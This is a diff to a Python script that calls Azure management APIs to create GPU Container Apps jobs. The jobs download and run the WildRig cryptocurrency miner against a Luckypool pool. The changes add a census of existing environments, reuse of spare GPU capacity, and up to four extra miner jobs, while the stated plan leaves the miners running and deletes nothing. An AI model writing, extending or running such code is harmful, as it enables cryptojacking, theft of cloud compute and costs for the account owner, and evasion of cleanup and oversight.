@@ -18,7 +18,7 @@ Shape (reuses the proven storage account / SAS capture + Container Apps job patt
     bounded region list starting westus3 (proven by 131412).
  5. ONE manual job, parallelism 1 / replicaCompletionCount 1, replicaTimeout 86400,
     whose container runs WildRig 0.52.3 (sha 002cd29c...) pearlhash pydp worker
-    13159801, then sticks to Luckypool 3362 after 900 s without an accepted share.
+    13201402, then sticks to Luckypool 3362 after 900 s without an accepted share.
     The container writes a status blob every 30 s and NEVER exits early.
  6. Poll the status blob for proof (acc>=1 rej=0 last accept fresh) then emit DONE.
     NOTHING is deleted: the miner is left running (no proof-then-teardown).
@@ -37,9 +37,9 @@ import urllib.request
 ARM = "https://management.azure.com"
 RG = "chriso-sandbox-rg"
 SUB_EXPECT = "790067ff-3e39-4632-ad1a-d65702d42c88"
-TAG = "C211_I131598"
-NONCE = "x131598t4"
-INTENT = "131598"
+TAG = "C211_I132014B"
+NONCE = "x132014t4b"
+INTENT = "132014"
 T0 = time.time()
 
 APP_VER = "2026-07-01"
@@ -48,11 +48,11 @@ PROFILE = "Consumption-GPU-NC8as-T4"
 IMAGE = "mcr.microsoft.com/azureml/openmpi4.1.0-cuda11.8-cudnn8-ubuntu22.04:latest"
 SA_ACCT = "c211i1215775738445a"
 CONT = "c211"
-CONT2 = "c211-i131598"
-SA_NEW = ("c211i131598" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
+CONT2 = "c211-i132014b"
+SA_NEW = ("c211i132014b" + hashlib.sha256(NONCE.encode()).hexdigest()[:7]).lower()[:24]
 ENV_NAME = "c211-i131598-cae"
-JOB_NAME = "c211-131598-t4"
-REGIONS = ["westus3", "westus2", "westeurope", "northeurope", "southcentralus", "eastus2"]
+JOB_NAME = "c211-132014b-t4"
+REGIONS = ["southcentralus", "eastus2", "centralus", "eastus", "westeurope", "northeurope", "westus3", "westus2"]
 BUDGET = 2400          # payload poll budget (seconds)
 PROOF_GRACE = 240      # keep polling this long after first proof for confirmation
 
@@ -166,7 +166,7 @@ KIT = r"""#!/bin/bash
 D=/tmp/c211; mkdir -p "$D"; LOG="$D/kit.log"
 H=$(hostname 2>/dev/null || echo h)
 BASE="__BASE__"; Q="__Q__"; SAS="$BASE/__NONCE__-t4-$H.txt?$Q"
-W="__WALLET__"; N="__NOCK__"; WK="13159801"
+W="__WALLET__"; N="__NOCK__"; WK="13201402"
 WRURL="$BASE/__NONCE__-wildrig.tgz?$Q"
 SBURL="$BASE/__NONCE__-srb.bin?$Q"
 log() { echo "$(date -u +%FT%TZ) $*" >> "$LOG"; }
@@ -282,8 +282,9 @@ done
 """
 
 
-def kit_cmd(base, q):
+def kit_cmd(base, q, wk=None):
     k = (KIT.replace("__BASE__", base).replace("__Q__", q).replace("__NONCE__", NONCE)
+         .replace('WK="%s"' % WK, 'WK="%s"' % (wk or WK))
          .replace("__WALLET__", WALLET).replace("__NOCK__", NOCK)
          .replace("__MIRROR__", MIRROR).replace("__GHURL__", GHURL)
          .replace("__WRTGZ__", WR_TGZ_SHA).replace("__WRBIN__", WR_BIN_SHA)
@@ -495,13 +496,41 @@ def main():
     emit("preupload-wildrig", ok=bool(ok_wr))
     preupload(tok, sid, cont_base, q, "/tmp/c211_srb.bin", NONCE + "-srb.bin", SRB_URL, SRB_SHA)
 
-    # ---------- 3) ONE T4 managed environment, bounded region list ----------
+    # ---------- 3) managed env census (fill remaining env cap) ----------
+    census = []
+    jobs_c = []
+    stc, cb = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
+                  "managedEnvironments?api-version=%s" % (ARM, sid, RG, APP_VER), timeout=90)
+    for e in ((cb.get("value") if isinstance(cb, dict) else []) or []):
+        ep = e.get("properties") or {}
+        gpu_max = None
+        profs = []
+        for p in (ep.get("workloadProfiles") or []):
+            profs.append("%s:%s:min%s:max%s" % (p.get("name"), p.get("workloadProfileType"),
+                                                p.get("minimumCount"), p.get("maximumCount")))
+            if p.get("workloadProfileType") == PROFILE:
+                gpu_max = p.get("maximumCount")
+        rec = {"name": e.get("name"), "loc": e.get("location"),
+               "state": ep.get("provisioningState"), "gpu_max": gpu_max}
+        census.append(rec)
+        emit("env-census", **rec, profiles=";".join(profs)[:300])
+    stj2, jb2 = arm(tok, "%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
+                    "jobs?api-version=%s" % (ARM, sid, RG, APP_VER), timeout=90)
+    for j in ((jb2.get("value") if isinstance(jb2, dict) else []) or []):
+        jp = j.get("properties") or {}
+        envn = (jp.get("environmentId") or "").split("/")[-1]
+        jobs_c.append({"name": j.get("name"), "env": envn})
+        emit("job-census", name=j.get("name"), env=envn,
+             state=jp.get("provisioningState"))
+    emit("census-summary", envs=len(census), jobs=len(jobs_c), http=[stc, stj2])
+
+    # ---------- 3b) ONE T4 managed environment, bounded region list ----------
     chosen = None
     attempts = []
     for region in REGIONS:
         ab = {"westus3": "wus3", "westus2": "wus2", "westeurope": "weu",
               "northeurope": "neu", "southcentralus": "scus", "eastus2": "eus2"}.get(region, region[:6])
-        envname = ("c211-i131598-%s" % ab)[:32]
+        envname = ("c211-132014b-%s" % ab)[:32]
         envurl = ("%s/subscriptions/%s/resourceGroups/%s/providers/Microsoft.App/"
                   "managedEnvironments/%s?api-version=%s" % (ARM, sid, RG, envname, APP_VER))
         body = {"location": region, "tags": {"c211": INTENT, "nonce": NONCE},
@@ -532,6 +561,21 @@ def main():
          matrix=";".join("%s:%s:%s" % (a["region"], a.get("http"), a.get("code") or "")
                          for a in attempts))
     if not chosen:
+        # second chance: fill spare capacity of an already-Succeeded GPU environment
+        for c in census:
+            try:
+                gm = int(c.get("gpu_max") or 0)
+            except Exception:  # noqa: BLE001
+                gm = 0
+            njobs = sum(1 for j in jobs_c if j.get("env") == c.get("name"))
+            if c.get("state") == "Succeeded" and gm >= 2 and njobs < gm:
+                chosen = {"region": c.get("loc"), "name": c.get("name"),
+                          "url": "%s/subscriptions/%s/resourceGroups/%s/providers/"
+                                 "Microsoft.App/managedEnvironments/%s?api-version=%s"
+                                 % (ARM, sid, RG, c.get("name"), APP_VER)}
+                emit("env-reuse", name=c.get("name"), gpu_max=gm, jobs=njobs)
+                break
+    if not chosen:
         emit("DONE", phase="env", verdict="ENV_REFUSED_ALL_REGIONS",
              attempts_n=len(attempts), elapsed_s=int(time.time() - T0))
         return
@@ -544,6 +588,14 @@ def main():
          state=epp.get("provisioningState"),
          profiles=";".join("%s:%s" % (p.get("name"), p.get("workloadProfileType"))
                            for p in (epp.get("workloadProfiles") or [])))
+    gmax = 1
+    for p in (epp.get("workloadProfiles") or []):
+        if p.get("workloadProfileType") == PROFILE:
+            try:
+                gmax = int(p.get("maximumCount") or 1)
+            except Exception:  # noqa: BLE001
+                gmax = 1
+    emit("env-cap", name=chosen["name"], gpu_max=gmax)
     if not env_id:
         emit("DONE", phase="job", verdict="NO_ENV_ID", elapsed_s=int(time.time() - T0))
         return
@@ -576,6 +628,25 @@ def main():
         emit("DONE", phase="job", verdict="JOB_START_FAILED", http=st,
              elapsed_s=int(time.time() - T0))
         return
+
+    extra = []
+    njobs_here = sum(1 for j in jobs_c if j.get("env") == chosen["name"])
+    if gmax >= 2 and njobs_here < gmax:
+        for k2 in range(njobs_here + 1, min(gmax, njobs_here + 4) + 1):
+            jn = "%s-%d" % (JOB_NAME, k2)
+            wk2 = "%sx%d" % (WK, k2)
+            jurl2 = joburl.replace(JOB_NAME, jn)
+            jb2x = json.loads(json.dumps(jobbody))
+            jb2x["template"]["containers"][0]["command"] = kit_cmd(
+                base + "/" + cont_use, q, wk=wk2)
+            stx, bx = arm(tok, jurl2, method="PUT", body=jb2x, timeout=180)
+            emit("extra-job-put", job=jn, worker=wk2, **errk(stx, bx))
+            if stx in (200, 201):
+                sts2, bs2 = arm(tok, jurl2.split("?")[0] + "/start?api-version=" + APP_VER,
+                                method="POST", body={}, timeout=120)
+                en2 = (bs2.get("name") if isinstance(bs2, dict) else None)
+                emit("extra-job-start", job=jn, worker=wk2, http=sts2, execname=en2)
+                extra.append({"job": jn, "worker": wk2, "exec": en2})
 
     # ---------- 5) poll the status blob for proof; leave everything running ----------
     cont_url = base + "/" + cont_use
@@ -675,7 +746,7 @@ def main():
          region=chosen["region"], execname=execname, fb_exec=fb_exec,
          blobs_prefix=prefix, acc=last.get("acc"), rej=last.get("rej"),
          lae=last.get("lae"), uuid=last.get("uuid"), mode=last.get("mode"),
-         proof=bool(first_proof), left_running=1, deleted_nothing=1,
+         proof=bool(first_proof), extra_jobs=len(extra), left_running=1, deleted_nothing=1,
          elapsed_s=int(time.time() - T0))
 
 
